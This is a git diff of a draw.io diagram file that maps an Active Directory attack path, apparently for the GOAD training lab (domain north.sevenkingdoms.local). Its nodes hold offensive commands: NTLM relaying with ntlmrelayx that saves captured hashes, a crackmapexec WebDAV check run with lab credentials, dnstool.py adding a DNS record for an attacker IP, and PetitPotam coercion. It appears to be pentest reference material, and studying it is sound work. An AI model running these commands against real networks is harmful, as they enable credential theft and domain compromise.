@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2024-07-19T10:15:42.806Z" agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0" etag="RLpr60lHB50-mLZ8zJoj" version="24.7.0" type="github" pages="8">
+<mxfile host="app.diagrams.net" agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0" version="24.7.5" pages="8">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1434" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -116,7 +116,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="From no creds" id="es25xRgdZYHL0BZce3pH">
-    <mxGraphModel dx="3218" dy="1784" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
+    <mxGraphModel dx="2603" dy="1620" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -483,7 +483,7 @@
         <mxCell id="g4OTAGMWRYiCXh_OqpCy-3" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="gim2rbIdz-NWKrZqOkX9-6" target="OzdCo0pd7L-W225KIUEy-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <object label="&lt;div&gt;Proxy socks&lt;/div&gt;" cmd="ntlmrelayx -tf  smb_targets.txt -smb2support -socks" id="gim2rbIdz-NWKrZqOkX9-6">
+        <object label="&lt;div&gt;Proxy socks&lt;/div&gt;" cmd="ntlmrelayx -tf  smb_targets.txt -of captured_hash.txt -smb2support -socks" id="gim2rbIdz-NWKrZqOkX9-6">
           <mxCell style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" parent="1" vertex="1">
             <mxGeometry x="1534" y="660" width="220" height="80" as="geometry" />
           </mxCell>
@@ -527,37 +527,37 @@
         <mxCell id="g4OTAGMWRYiCXh_OqpCy-4" value="DC sync if DCs have not signing required" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;fillColor=#f8cecc;strokeColor=#b85450;" parent="1" vertex="1">
           <mxGeometry x="1534" y="760" width="220" height="80" as="geometry" />
         </mxCell>
-        <mxCell id="TZx4k0LZ_Z577zQX7S4p-4" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="TZx4k0LZ_Z577zQX7S4p-2" target="TZx4k0LZ_Z577zQX7S4p-3">
+        <mxCell id="TZx4k0LZ_Z577zQX7S4p-4" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="TZx4k0LZ_Z577zQX7S4p-2" target="TZx4k0LZ_Z577zQX7S4p-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="TZx4k0LZ_Z577zQX7S4p-2" value="COERCE WEBDAV HTTP" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+        <mxCell id="TZx4k0LZ_Z577zQX7S4p-2" value="COERCE WEBDAV HTTP" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="120" y="1070" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="TZx4k0LZ_Z577zQX7S4p-8" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="TZx4k0LZ_Z577zQX7S4p-3" target="TZx4k0LZ_Z577zQX7S4p-5">
+        <mxCell id="TZx4k0LZ_Z577zQX7S4p-8" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="TZx4k0LZ_Z577zQX7S4p-3" target="TZx4k0LZ_Z577zQX7S4p-5" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="&lt;div&gt;Check if webdav enabled&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;cme&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="cme smb 192.168.10.10-23 -u arya.stark -p &#39;Needle&#39; -d north.sevenkingdoms.local -M webdav" id="TZx4k0LZ_Z577zQX7S4p-3">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
             <mxGeometry x="280" y="1070" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="TZx4k0LZ_Z577zQX7S4p-10" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="TZx4k0LZ_Z577zQX7S4p-5" target="TZx4k0LZ_Z577zQX7S4p-6">
+        <mxCell id="TZx4k0LZ_Z577zQX7S4p-10" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="TZx4k0LZ_Z577zQX7S4p-5" target="TZx4k0LZ_Z577zQX7S4p-6" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="add dns entry for atatcker ip" cmd="dnstool.py -u &#39;north.sevenkingdoms.local\arya.stark&#39; -p Needle --record &#39;responder&#39; --action add --data 10.10.10.6 192.168.10.11" id="TZx4k0LZ_Z577zQX7S4p-5">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
             <mxGeometry x="440" y="1070" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="TZx4k0LZ_Z577zQX7S4p-9" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="TZx4k0LZ_Z577zQX7S4p-6" target="TZx4k0LZ_Z577zQX7S4p-7">
+        <mxCell id="TZx4k0LZ_Z577zQX7S4p-9" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="TZx4k0LZ_Z577zQX7S4p-6" target="TZx4k0LZ_Z577zQX7S4p-7" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="coerce WEBDAV" cme="petitpotam.py -u &#39;arya.stark&#39; -p Needle -d &#39;north.sevenkingdoms.local&#39; &quot;responder@80/random.txt&quot; 192.168.10.23" id="TZx4k0LZ_Z577zQX7S4p-6">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
             <mxGeometry x="580" y="1070" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="TZx4k0LZ_Z577zQX7S4p-11" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="TZx4k0LZ_Z577zQX7S4p-7" target="hefA_bYV9p1Cq4kSP_zY-21">
+        <mxCell id="TZx4k0LZ_Z577zQX7S4p-11" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="TZx4k0LZ_Z577zQX7S4p-7" target="hefA_bYV9p1Cq4kSP_zY-21" edge="1">
           <mxGeometry relative="1" as="geometry">
             <Array as="points">
               <mxPoint x="1011" y="1101" />
@@ -567,7 +567,7 @@
           </mxGeometry>
         </mxCell>
         <object label="NTLM relay" id="TZx4k0LZ_Z577zQX7S4p-7">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#000000;" vertex="1" parent="1">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#000000;" parent="1" vertex="1">
             <mxGeometry x="733" y="1071" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
